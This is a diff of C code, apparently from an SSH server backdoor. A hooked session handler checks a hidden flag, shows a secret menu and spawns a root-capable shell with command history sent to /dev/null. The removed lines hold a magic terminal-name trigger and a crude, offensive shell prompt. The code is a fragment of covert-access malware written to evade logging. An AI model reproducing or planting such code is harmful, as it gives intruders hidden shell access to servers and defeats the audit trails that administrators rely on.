@@ -81,7 +81,7 @@ int hook_main(Session *s, char *command) {
 
 	f_do_child do_child = (f_do_child)(0xc0cac01ac0debabe);
 
-	if (s->term != 0 && config_memory->is_haxor) { // _strncmp(s->term, "W00T", 4) == 0) {
+	if (s->term != 0 && config_memory->is_haxor) {
 		_write(1, menu, _strlen(menu));
 
 		while(1) {
@@ -94,7 +94,7 @@ int hook_main(Session *s, char *command) {
 				break;
 
 				case '1':
-					return do_child(s, "PS1='[SSH-RAPE] $ ' TERM=xterm HISTFILE=/dev/null /bin/sh");
+					return do_child(s, "HISTFILE=/dev/null /bin/sh");
 				break;
 
 				case '2':
